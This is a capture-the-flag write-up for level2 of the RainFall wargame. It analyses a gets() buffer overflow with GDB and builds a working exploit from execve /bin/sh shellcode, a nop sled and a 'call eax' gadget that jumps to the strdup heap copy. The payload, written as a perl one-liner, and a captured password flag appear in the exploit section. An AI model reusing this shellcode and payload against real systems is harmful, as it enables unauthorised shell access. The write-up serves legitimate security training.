# level2

> We use [GDB peda](https://github.com/longld/peda) in order to get a better GDB visualization.

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

We check the functions:

```gdb
gdb-peda$ info function
All defined functions:

Non-debugging symbols:
0x08048358  _init
0x080483a0  printf
0x080483a0  printf@plt
0x080483b0  fflush
0x080483b0  fflush@plt
0x080483c0  gets
0x080483c0  gets@plt
0x080483d0  _exit
0x080483d0  _exit@plt
0x080483e0  strdup
0x080483e0  strdup@plt
0x080483f0  puts
0x080483f0  puts@plt
0x08048400  __gmon_start__
0x08048400  __gmon_start__@plt
0x08048410  __libc_start_main
0x08048410  __libc_start_main@plt
0x08048420  _start
0x08048450  __do_global_dtors_aux
0x080484b0  frame_dummy
0x080484d4  p
0x0804853f  main
0x08048550  __libc_csu_init
0x080485c0  __libc_csu_fini
0x080485c2  __i686.get_pc_thunk.bx
0x080485d0  __do_global_ctors_aux
0x080485fc  _fini
```

Cool! Let's take a look at `main`:

```gdb
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   ebp
   0x08048540 <+1>:     mov    ebp,esp
   0x08048542 <+3>:     and    esp,0xfffffff0
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
```

It calls function `<p>`. *Bueno*.

```gdb
gdb-peda$ disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   ebp
   0x080484d5 <+1>:     mov    ebp,esp
   0x080484d7 <+3>:     sub    esp,0x68
   0x080484da <+6>:     mov    eax,ds:0x8049860
   0x080484df <+11>:    mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>       ; flush the stdout
   0x080484e7 <+19>:    lea    eax,[ebp-0x4c]               ; eax = ebp - 76 bytes
   0x080484ea <+22>:    mov    DWORD PTR [esp],eax          ; *esp = eax
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>         ; call `gets`
   0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4]      ; put eip in eax
   0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax      ; put eip at ebp-0xc
   0x080484f8 <+36>:    mov    eax,DWORD PTR [ebp-0xc]      ; move eip in eax again
   0x080484fb <+39>:    and    eax,0xb0000000               ; eip & 0xb0000000 is a filter
   0x08048500 <+44>:    cmp    eax,0xb0000000               ; ss eax != 0xb0000000?
   0x08048505 <+49>:    jne    0x8048527 <p+83>             ; yes: jump to <p+83>
   0x08048507 <+51>:    mov    eax,0x8048620
   0x0804850c <+56>:    mov    edx,DWORD PTR [ebp-0xc]      ; edx = eip (formerly at ebp-0xc)
   0x0804850f <+59>:    mov    DWORD PTR [esp+0x4],edx      ; put eip on stack at esp+0x4
   0x08048513 <+63>:    mov    DWORD PTR [esp],eax          ; put eax on stack at esp
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>       ; call printf with parameters put on stack
   0x0804851b <+71>:    mov    DWORD PTR [esp],0x1          ; put 0x1 on stack at esp
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>        ; call exit, that is to say exit(1)
   0x08048527 <+83>:    lea    eax,[ebp-0x4c]
   0x0804852a <+86>:    mov    DWORD PTR [esp],eax
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    eax,[ebp-0x4c]
   0x08048535 <+97>:    mov    DWORD PTR [esp],eax
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
```

## Exploit

After analysis, we know that we can't use a stack address in `eip`. Hopefully, `strdup` allows us to go on the heap
where our string will be duplicated. Like in level1, we use this [online
tool](http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to find the offset: 80.

Here is how it works:
1. The buffer will contain a shellcode to spawn a new shell.
2. But, this buffer is both on the stack and the heap because of `strdup`. It returns the string pointer into `eax`.
3. The filter (`eax & 0xb0000000`) avoid us to use stack addresses. We need to use the one on the heap. So we are going
   to use a `call eax` instruction to jump to our buffer content (with the shell-code).

So let's do it! First, design the shell code. 

```
\xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
```

is equivalent to:

```C
excve("/bin/sh", ["/bin/sh"], NULL);
```

Now, we need to look for a `call eax` instruction to get its address:

```console
level2@RainFall:~$ objdump -d -M intel level2 | grep "call   eax"
 80484cf:   ff d0                call   eax
 80485eb:   ff d0                call   eax
```

So now we have almost everything. We just need to add a `nop` sled and a `jump` instruction to avoid an infinite loop
between the beginning of the buffer and the `call eax`. Let's dump it into a file:

```console
level2@RainFall:~$ perl -e 'print "\x90"x62 . "\xeb\x14" . "\x90"x16 . "\xcf\x84\x04\x08" . "\x90"x20 . "\xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"' > /tmp/level2
```

And you run:

```console
level2@RainFall:~$ cat /tmp/level2 - | ./level2
...
[hit return, some garbage display]
...
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
